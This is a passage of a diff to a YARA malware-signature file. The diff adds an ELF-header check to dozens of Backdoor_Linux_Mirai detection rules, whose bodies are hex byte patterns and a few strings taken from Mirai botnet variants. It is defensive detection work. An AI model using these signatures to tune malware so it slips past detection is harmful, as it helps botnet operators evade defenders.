+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7266,6 +7571,7 @@ rule Backdoor_Linux_Mirai_II_2147909014_0
         $x_1_2 = {14 00 84 90 02 1e 10 00 02 2a 05 00 00 32 06 00 00 86 10 00 25 18 65 00 25 80 06 02 06 10 82 00 25 18 70 00 21 18 62 00 24 38 67 00 00 ff 64 30 02 16 03 00 02 3a 07 00 00 22 04 00 00 1e 03 00 25 10 47 00 25 18 64 00 25 10 43 00 18 00 bc 8f 10 00 22 ae}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7290,6 +7596,7 @@ rule Backdoor_Linux_Mirai_HX_2147909857_0
         $x_1_4 = {92 07 bf e4 7f ff ff ad 94 10 20 10 a0 92 20 00 36 80 00 0a}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7312,6 +7619,7 @@ rule Backdoor_Linux_Mirai_HY_2147909858_0
         $x_1_2 = {41 55 41 89 d5 41 54 45 31 e4 55 53 48 83 ec 08 8b 5f 0c 8b 6f 10 eb 0d}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7334,6 +7642,7 @@ rule Backdoor_Linux_Mirai_IG_2147909859_0
         $x_1_2 = {13 5f d6 09 30 8f 6d 1b 1c cb 06 a3 8b 34 3f b6 04 80 03 c3 bf 33 ba a7 09 e1 83 ef b3 93 bb 45 13 bc 02 b7 da 57 20 8a be e2 9b 23 b1 8b c3 92 e5 23 c6 1e 47 3b 92 e5 b7 0d a9 0e 23 40 f7 7b 00 47 c2 50 f3 81 b7 af ba 6f db 02 2c 1b f7 b4 fd 13 0a d7 12 cf ee f2 0f 1f 37 0e 7b f7 87 6c e2 97 0c 7d 37 9c d7 43 07 53 ba 8f 08 19 73 f7 8f 22 13 3e 1f ea e0 3b 3a e7 16 9e 82 24 1b 41 d8 a3 e1 d9 60 c3 f0 53 0c f2 93 87 80 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7356,6 +7665,7 @@ rule Backdoor_Linux_Mirai_IN_2147909861_0
         $x_1_2 = {02 14 06 00 ff ff c3 30 21 18 62 00 02 14 03 00 21 10 43 00 27 10 02 00 08 00 e0 03 ff ff 42 30}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7378,6 +7688,7 @@ rule Backdoor_Linux_Mirai_GR_2147910129_0
         $x_1_2 = {05 00 1c 3c 1c 85 9c 27 21 e0 99 03 21 10 a0 00 5c 80 99 8f 21 38 c0 00 21 28 80 00 21 30 40 00 08 00 20 03 a5 0f 04 24}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7400,6 +7711,7 @@ rule Backdoor_Linux_Mirai_HH_2147910130_0
         $x_1_2 = {84 40 a0 e1 06 30 84 e2 03 30 c3 e3 0d d0 63 e0 38 c0 4b e2 04 c0 8d e5 07 00 a0 e1 3c c0 4b e2 02 10 a0 e3 60 20 4b e2 10 30 8d e2 08 c0 8d e5 00 40 8d e5 9a 03 00 eb 22 00 50 e3 03 ?? ?? ?? 3c 30 1b e5 01 00 73 e3}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7422,6 +7734,7 @@ rule Backdoor_Linux_Mirai_HN_2147910131_0
         $x_1_2 = {b4 37 9f e5 00 20 93 e5 12 3e a0 e3 ?? 23 24 e0 0c 00 94 e5 01 00 50 e3 1e 10 a0 83 02 ?? ?? ?? 00 00 50 e3 33 ?? ?? ?? 05 10 a0 e3}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7444,6 +7757,7 @@ rule Backdoor_Linux_Mirai_IK_2147910132_0
         $x_1_2 = {94 21 ff e0 7c 08 02 a6 90 61 00 08 38 60 00 66 90 81 00 0c 38 80 00 03 90 a1 00 10 38 a1 00 08 90 01 00 24 4c c6 31 82 48 00 02 85 80 01 00 24 38 21 00 20 7c 08 03 a6 4e 80 00 20}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7465,6 +7779,7 @@ rule Backdoor_Linux_Mirai_HT_2147910821_0
         $x_4_1 = {89 d0 8a 5c 24 0f 03 01 30 18 89 d0 03 01 8a 5c 24 10 30 18 89 d0 03 01 8a 5c 24 20 30 18 89 d0 89 f3 42 03 01 30 18}  //weight: 4, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7487,6 +7802,7 @@ rule Backdoor_Linux_Mirai_GU_2147911092_0
         $x_1_2 = {44 00 44 8c 10 00 43 8c 48 00 45 94 28 00 63 24 08 00 04 a2 ff ff 63 30 04 00 66 8e ff 00 62 30 ff 00 a4 30 00 12 02 00 00 22 04 00 02 1a 03 00 02 2a 05 00 4c 00 c7 8c 25 18 62 00 25 28 a4 00 02 00 03 a6 03 ?? ?? ?? 04 00 05 a6 40 00 02 24 06 00 02 a6}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7509,6 +7825,7 @@ rule Backdoor_Linux_Mirai_IM_2147911093_0
         $x_1_2 = {84 89 20 ff 02 ?? ?? ?? c6 0a 40 00 82 08 e0 ff 80 a0 80 01 22 ?? ?? ?? ?? 02 20 01 82 08 e0 ff 81 c3 e0 08 ?? 20 80 01 92 02 60 01 94 02 bf ff 80 a2 a0 00}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7531,6 +7848,7 @@ rule Backdoor_Linux_Mirai_IR_2147911094_0
         $x_1_2 = {8b 4c 24 0c 8b 5c 24 10 31 c0 8b 35 98 42 05 08 39 d9 74 ?? 0f b6 01 0f bf 14 46 0f b6 03 0f bf 04 46 29 c2 89 d0}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7553,6 +7871,7 @@ rule Backdoor_Linux_Mirai_FT_2147911239_0
         $x_1_2 = {00 30 85 e5 00 30 9c e5 00 30 84 e5 00 20 9c e5 00 30 9c e5 a2 39 23 e0 00 30 8c e5 00 20 9c e5 8e e5 2e e0 02 20 2e e0 2e 24 22 e0 00 20 8c e5 00 30 9c e5 04 d0 4d e2 00 40 a0 e1 01 10 60 e0 03 00 a0 e1}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7575,6 +7894,7 @@ rule Backdoor_Linux_Mirai_IQ_2147911542_0
         $x_1_2 = {48 e0 00 42 2a 32 5d d0 23 61 8a 21 28 31 ae 96 13 65 00 45 13 64 fc 36 0b 40 5a 35 a8 91 fc 31 13 62 08 32}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7597,6 +7917,7 @@ rule Backdoor_Linux_Mirai_IT_2147912328_0
         $x_1_2 = {e2 d8 e3 9f 7b 46 37 0c f5 ab 00 dd ac 82 62 5b 21 16 e3 85 a9 96 7c 34 00 d9 ac 96 70 5b 34 17 f9 d8 a5 db 6a 1a 32 01 fe ab 00 c8 a5 86 7c 51 25 1d f1 d9 a8 c1 7b 5a 32 01 90 00 cd a2 9d 76 47 24 1f f1 d2 e3 86 7c 50 2f 78 00 c7 a4 8c 79}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7619,6 +7940,7 @@ rule Backdoor_Linux_Mirai_IU_2147912329_0
         $x_1_2 = {18 d0 4d e2 b0 02 00 eb 00 c0 dd e5 0e 00 5c e3 78 ?? ?? ?? 0c 48 2d e9 00 b0 d0 e5 06 cc a0 e3 ab b1 a0 e1 1c cb a0 e1 0d b0 a0 e1 3a cd 8c e2 0c d0 4d e0 00 c0 93 e5 08 30 8d e5 04 c0 8d e5 00 20 8d e5 0c 30 8d e2 00 c0 a0 e3}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7642,6 +7964,7 @@ rule Backdoor_Linux_Mirai_IX_2147913316_0
         $x_2_3 = "example.ulfheim.net" ascii //weight: 2
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_2_*) and 1 of ($x_1_*))) or
             (all of ($x*))
@@ -7667,6 +7990,7 @@ rule Backdoor_Linux_Mirai_JF_2147913317_0
         $x_1_2 = {0c 91 10 34 00 8b 5f 65 53 61 00 41 1a 31 53 60 e3 6f f6 6e 0b 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7689,6 +8013,7 @@ rule Backdoor_Linux_Mirai_EX_2147913421_0
         $x_1_2 = {21 10 43 02 00 00 42 80 00 00 00 00 ec ff 40 10 00 00 00 00 ?? ?? ?? ?? 01 00 63 24 ff ff 63 24 03 00 71 24 02 00 66 24 21 10 a6 02 20 00 43 80 00 00 00 00 c8 01 60 10 20 00 02 24 c5 01 62 10 01 00 c2 24 21 10 42 02 21 20 c0 00 03 00 00 10 20 00 05 24}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7711,6 +8036,7 @@ rule Backdoor_Linux_Mirai_FQ_2147913422_0
         $x_1_2 = {00 86 10 00 25 18 65 00 25 80 06 02 06 10 82 00 25 18 70 00 21 18 62 00 24 38 67 00 00 ff 64 30 02 16 03 00 02 3a 07 00 00 22 04 00 00 1e 03 00 25 10 47 00 25 18 64 00 25 10 43 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7733,6 +8059,7 @@ rule Backdoor_Linux_Mirai_FZ_2147913423_0
         $x_1_2 = {80 85 00 00 00 00 00 00 24 a2 ff d0 30 42 00 ff 2c 42 00 0a 10 40 00 0f 00 00 18 21 00 03 10 c0 00 03 18 40 00 62 18 21 24 84 00 01 00 65 18 21 80 85 00 00 00 00 00 00 24 a2 ff d0 30 42 00 ff 2c 42 00 0a 14 40 ff f5 24 63 ff d0 03 e0 00 08 00 60 10 21}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7755,6 +8082,7 @@ rule Backdoor_Linux_Mirai_GK_2147913424_0
         $x_1_2 = {0d 00 c5 10 00 00 00 00 00 00 c2 90 00 00 a3 90 40 10 02 00 40 18 03 00 21 10 47 00 21 18 67 00 00 00 44 84 00 00 62 84 00 00 00 00 23 20 82 00 05 00 80 14 00 00 00 00 00 00 c2 80 01 00 a5 24 ef ff 40 14 01 00 c6 24 08 00 e0 03 21 10 80 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7777,6 +8105,7 @@ rule Backdoor_Linux_Mirai_GM_2147913425_0
         $x_1_2 = {d1 ef 00 30 20 03 d0 8a 20 92 11 6a 00 04 00 04 5a 8a 5b 82 31 7c 00 02 ff f0 21 50 ff f4 41 e8 00 16 b0 8a 66 e2 4a 82 66 46 99 cc 4a af 00 30}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7799,6 +8128,7 @@ rule Backdoor_Linux_Mirai_GL_2147913426_0
         $x_1_2 = {26 10 00 20 26 31 ff e0 16 ?? ?? ?? 24 02 00 01 12 62 ff bd 00 00 98 21 8f ?? ?? ?? 00 00 00 00 03 20 f8 09 02 40 20 21 8f bc 00 10 00 00 10 21 8f bf 10 54 8f b4 10 50 8f b3 10 4c 8f b2 10 48 8f b1 10 44}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7821,6 +8151,7 @@ rule Backdoor_Linux_Mirai_GS_2147913427_0
         $x_1_2 = {0b 20 00 a4 ae 01 04 00 04 26 80 1f 00 00 03 80 01 68 21 6f 04 79 99 09 21 80 04 1d 00 14 06 26 c0 73 00 00 00 04 cb 78 ?? ?? 04 27 8f 1f 00 00 00 80 e5 7e 44 26 c0 10 20 95 01 68 47 20 c0 00 14 68 04 21 81 0f 00 00 00 20 04 26 8e 1f ff ff 00 84}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7843,6 +8174,7 @@ rule Backdoor_Linux_Mirai_HI_2147913428_0
         $x_1_2 = {24 e8 ff d0 29 02 01 00 10 40 00 24 24 84 00 01 80 86 00 00 00 08 18 c0 00 08 10 40 00 43 10 21 00 06 18 40 00 69 18 21 94 63 00 00 00 46 38 21 30 62 00 08 14 40 ff f2 29 42 00 04 10 40 00 05 00 00 00 00 14 cc 00 15 24 84 00 01 10 00 00 07 00 0b 12 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7865,6 +8197,7 @@ rule Backdoor_Linux_Mirai_HL_2147913429_0
         $x_1_2 = {00 c0 a0 e3 04 00 00 ea 00 30 d0 e5 01 20 d0 e5 02 34 83 e1 03 c0 8c e0 02 00 80 e2 01 00 51 e3 02 10 41 e2 f7 ff ff 8a 00 30 d0 05 03 c0 8c 00 0c 08 a0 e1 20 08 a0 e1 2c 08 80 e0 20 08 80 e0 00 00 e0 e1 00 08 a0 e1 20 08 a0 e1}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7887,6 +8220,7 @@ rule Backdoor_Linux_Mirai_EP_2147913525_0
         $x_1_2 = {48 83 7c 24 18 00 0f 84 e6 fd ff ff 44 0f b6 64 24 17 45 85 e4 7e 1f 48 8b 5c 24 18 31 ed}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7909,6 +8243,7 @@ rule Backdoor_Linux_Mirai_FO_2147913526_0
         $x_1_2 = {00 00 59 e3 00 00 89 15 00 00 5a e3 02 71 e0 03 02 71 a0 13 00 60 e0 03 00 60 a0 13 00 30 5b e2 01 30 a0 13 07 00 55 e1 00 20 a0 e3}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7931,6 +8266,7 @@ rule Backdoor_Linux_Mirai_JA_2147913527_0
         $x_1_2 = {81 5e 00 0c 7d 3e 8a 14 80 1e 00 08 7f df f3 78 91 09 00 04 90 09 00 08 62 20 00 01 91 2a 00 08 91 49 00 0c 81 69 00 08 7c 1e 89 2e 90 1e 00 04 91 2b 00 0c 7d 07 f1 2e}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7953,6 +8289,7 @@ rule Backdoor_Linux_Mirai_JC_2147913528_0
         $x_1_2 = {00 17 89 00 04 21 8b 1f 00 00 c0 00 52 23 fe 91 e8 ?? 96 6c 44 21 c9 1f 42 23 43 00 40 2e 46 01 21 74 40 27 47 00 40 2e 49 00 06 24 4c 12}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7975,6 +8312,7 @@ rule Backdoor_Linux_Mirai_JG_2147913529_0
         $x_1_2 = {fc 10 01 80 42 20 03 01 07 21 41 01 00 21 84 0f fe 7e ff fe 07 21 01 01 06 26 41 70 01 81 00 01 16 ?? 23 8b 0b ?? ?? ?? e0 7f 42 20 40 00}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7997,6 +8335,7 @@ rule Backdoor_Linux_Mirai_JH_2147913530_0
         $x_1_2 = {ff e0 8c 52 19 23 8b 51 38 23 2c 31 29 00 11 18 ff 70 12 18 26 4f}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8019,6 +8358,7 @@ rule Backdoor_Linux_Mirai_HS_2147913532_0
         $x_1_2 = {82 08 40 03 84 00 80 04 82 06 80 01 82 00 40 1c 10 80 00 03 82 00 40 02 82 00 c0 02 85 30 60 10 80 a0 a0 00 12 bf ff fd 86 08 40 1b b0 38 00 01 b1 2e 20 10 b1 36 20 10 81 c7 e0 08 81 e8 00 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8041,6 +8381,7 @@ rule Backdoor_Linux_Mirai_HW_2147913533_0
         $x_1_2 = {0e 00 00 da 5c 30 9f e5 00 20 93 e5 00 c0 92 e5 04 30 dc e5 07 00 53 e1 05 00 a0 11 04 00 00 1a 08 00 00 ea 00 c1 92 e7 04 30 dc e5 07 00 53 e1 04 00 00 0a 01 00 80 e2 01 00 50 e1 f8 ff ff 1a 00 00 a0 e3 51 ff ff eb}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8063,6 +8404,7 @@ rule Backdoor_Linux_Mirai_IE_2147913534_0
         $x_1_2 = {9a 06 00 11 c4 06 00 00 c4 20 ff f8 c2 0e 20 04 c2 28 ff fc 82 04 80 04 b2 06 7f fb c4 20 60 04 b0 06 20 05 82 10 20 02 c2 31 00 12 88 01 20 18 86 00 e0 18 80 a6 00 0d 12 bf ff f3 ba 10 00 08 80 a6 60 00 02 80 00 33 aa 10 20 00 c2 4b 00 11 80 a0 60 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8085,6 +8427,7 @@ rule Backdoor_Linux_Mirai_IP_2147913535_0
         $x_1_2 = {80 f9 d4 0f 94 c0 84 44 24 18 74 16 40 80 ff df 0f 97 c2 40 80 ff ff 0f 95 c0 84 d0 0f 85 3d ed ff ff 80 f9 59 0f 94 c0 84 44 24 33 74 16 40 80 ff 5f 0f 97 c2 40 80 ff 60 0f 96 c0 84 d0 0f 85 1b ed ff ff}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8107,6 +8450,7 @@ rule Backdoor_Linux_Mirai_FE_2147913993_0
         $x_1_2 = {00 04 18 c0 00 04 11 40 00 43 10 23 00 5e 28 21 8f a2 00 68 00 04 18 80 00 62 18 21 ?? a2 00 14 8c 71 00 00 2c 42 00 20 14 40 00 47 26 32 00 14 8f a3 00 28 24 02 ff ff}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8129,6 +8473,7 @@ rule Backdoor_Linux_Mirai_HP_2147914065_0
         $x_1_2 = {8b 73 08 75 17 69 06 6d 4e c6 41 05 39 30 00 00 25 ff ff ff 7f 89 06 89 45 00 eb 2b 8b 4b 04 8b 13 8b 7b 18 8b 01 01 02 8b 02 83 c2 04 d1 e8 39 fa 89 45 00 8d 41 04 72 04}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8151,6 +8496,7 @@ rule Backdoor_Linux_Mirai_IW_2147914067_0
         $x_1_2 = {00 00 00 00 13 23 00 08 24 50 ff fc 03 20 f8 09 26 10 ff fc 8e 19 00 00 24 02 ff ff 8f bc 00 10 17 22 ff fa 00 00 00 00 8f bf 00 1c 8f b0 00 18 03 e0 00 08 27 bd 00 20}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8173,6 +8519,7 @@ rule Backdoor_Linux_Mirai_JB_2147914110_0
         $x_1_2 = {c2 4a 3f ff 80 a0 60 0d 02 [0-3] ?? 02 3f ff 80 a0 60 0a 22 [0-3] c0 2a 00 00}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8195,6 +8542,7 @@ rule Backdoor_Linux_Mirai_JM_2147914113_0
         $x_1_2 = {4c 63 db 31 d2 45 31 d2 49 f7 f3 bd ff ff ff ff 41 89 d4 48 89 c6 31 d2}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8217,6 +8565,7 @@ rule Backdoor_Linux_Mirai_JN_2147914893_0
         $x_1_2 = {10 40 2d e9 08 40 9d e5 ac 00 ?? ef 01 0a 70 e3 00 40 a0 e1 03 ?? ?? ?? 17 01 00 eb 00 30 64 e2 00 30 80 e5 00 40 e0 e3 04 00 a0 e1 10 80 bd e8}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8239,6 +8588,7 @@ rule Backdoor_Linux_Mirai_ET_2147915799_0
         $x_1_2 = {34 1c ff ff 7c 09 03 a6 41 ?? ?? ?? 88 1d 00 01 39 3d 00 01 98 03 00 04 42 ?? ?? ?? 7d 69 02 a6 8b e9 00 01 38 89 00 01 3b ab ff ff 7f 9d f8 00 41 9c 00 a8}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8261,6 +8611,7 @@ rule Backdoor_Linux_Mirai_JE_2147915800_0
         $x_1_2 = {00 20 64 22 02 40 03 20 c8 00 9f e5 0f e0 a0 e1 05 f0 a0 e1 04 00 a0 e1 06 05 00 eb 01 00 70 e3 00 50 a0 01 04 ?? ?? ?? 03 30 80 e2 03 50 c3 e3 05 00 50 e1 05 00 60 10 fe 04 00 1b}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8283,6 +8634,7 @@ rule Backdoor_Linux_Mirai_JO_2147915944_0
         $x_1_2 = {00 30 d0 e5 00 30 53 e2 01 30 a0 13 04 00 58 e3 00 30 a0 c3 00 00 53 e3 db ?? ?? ?? 80 60 9d e5 68 11 9f e5 06 00 a0 e1 5e ?? ?? ?? 00 00 50 e3 01 50 a0 03}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8305,6 +8657,7 @@ rule Backdoor_Linux_Mirai_JP_2147917133_0
         $x_1_2 = {39 24 ff fe 55 29 f8 7e 39 29 00 01 7d 29 03 a6 39 20 00 00 a0 03 00 00 38 84 ff fe 38 63 00 02 7d 29 02 14 42 ?? ?? ?? 2f 84 00 01}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8327,6 +8680,7 @@ rule Backdoor_Linux_Mirai_JR_2147917136_0
         $x_1_2 = {c2 4a 00 00 c2 0a 00 00 82 00 40 01 c4 50 c0 01 c2 0a 40 00 82 00 40 01 c2 50 c0 01 84 a0 80 01 12 ?? ?? ?? 01 00 00 00 c2 4a 00 00 80 a0 60 00}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8349,6 +8703,7 @@ rule Backdoor_Linux_Mirai_JS_2147917787_0
         $x_1_2 = {80 30 80 e2 06 0d 53 e3 80 10 a0 e1 0e f0 a0 21 18 30 9f e5 00 30 93 e5 03 20 81 e0 03 10 d1 e7 01 30 d2 e5 03 3c a0 e1 43 08 81 e1 0e f0 a0 e1}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8371,6 +8726,7 @@ rule Backdoor_Linux_Mirai_JT_2147919056_0
         $x_1_2 = {00 10 a0 e1 50 31 1b e5 0c 20 93 e5 50 31 1b e5 08 30 93 e5 02 30 63 e0 01 30 83 e2 01 00 a0 e1 03 10 a0 e1}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8393,6 +8749,7 @@ rule Backdoor_Linux_Mirai_HV_2147919516_0
         $x_1_2 = {53 b8 c9 00 00 00 0f 05 48 3d 00 f0 ff ff 48 89 c3 76 ?? e8 34 02 00 00 89 da 48 83 cb ff f7 da 89 10}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8415,6 +8772,7 @@ rule Backdoor_Linux_Mirai_ID_2147919517_0
         $x_1_2 = {b8 42 00 00 00 cd 80 89 c2 81 fa 00 f0 ff ff 76 ?? b8 f8 ff ff ff f7 da 65 89 10 83 c8 ff}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8437,6 +8795,7 @@ rule Backdoor_Linux_Mirai_IL_2147919518_0
         $x_1_2 = {82 06 7f f4 f6 27 a0 50 80 a0 60 02 f8 27 a0 54 82 07 a0 50 fa 27 a0 58 f4 27 a0 4c ?? 10 00 18 92 10 00 19 94 10 00 1a 18 ?? ?? ?? c2 27 bf f4 40 00 00 15 01 00 00 00 81 c7 e0 08 91 e8 00 08}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8459,6 +8818,7 @@ rule Backdoor_Linux_Mirai_IZ_2147919519_0
         $x_1_2 = {22 3c 8d e2 02 00 81 e2 24 30 83 e2 00 20 83 e0 21 32 52 e5 00 00 53 e3 20 00 53 13 00 50 a0 01 07 ?? ?? ?? 01 20 86 e0 00 50 a0 e1}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8481,6 +8841,7 @@ rule Backdoor_Linux_Mirai_JD_2147919520_0
         $x_1_2 = {21 8d 01 6d a5 e1 c0 25 a1 10 ?? ?? 8c 1c 00 30 00 d8 40 c0 52 0d 20 00 55 24 c0 38 62 0c 20 00 55 24 c0 38 a4 14 00 30 4b ?? ?? ?? b2 14 81 30 55 24 c2 3d 16 26 40 70 ff ff f8 ff 18 62}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8503,6 +8864,7 @@ rule Backdoor_Linux_Mirai_JL_2147919522_0
         $x_1_2 = {30 c3 00 ff 24 62 ff d0 30 42 00 ff 2c 42 00 0a 14 ?? ?? ?? 24 62 ff bf 30 42 00 ff 2c 42 00 1a 10 ?? ?? ?? 24 62 ff 9f 24 02 00 37 10 ?? ?? ?? 00 c2 18 23}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8525,6 +8887,7 @@ rule Backdoor_Linux_Mirai_JQ_2147919523_0
         $x_1_2 = {ff 30 03 e2 03 30 61 e0 ff 10 03 e2 3c 20 1b e5 70 31 1b e5 94 03 03 e0 02 30 83 e0 05 20 83 e0 01 30 a0 e1 00 30 c2 e5 34 30 1b e5 01 30 83 e2 34 30 0b e5}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8550,6 +8913,7 @@ rule Backdoor_Linux_Mirai_JU_2147922951_0
         $x_1_5 = "openvpncrypt" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8575,6 +8939,7 @@ rule Backdoor_Linux_Mirai_JV_2147923934_0
         $x_1_5 = "AttackTcpRawBasic" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8597,6 +8962,7 @@ rule Backdoor_Linux_Mirai_JW_2147923945_0
         $x_1_2 = {23 00 01 00 84 04 a0 01 82 14 60 03 82 0c 00 01 82 00 60 01 84 08 40 02 80 a0 80 01 12 ?? ?? ?? f6 26 20 04 82 2c 00 12 80 88 60 08 02 ?? ?? ?? 82 0c 80 11 ?? 10 00 1b 92 10 20 04}  //weight: 1, accuracy: Low
     condition:
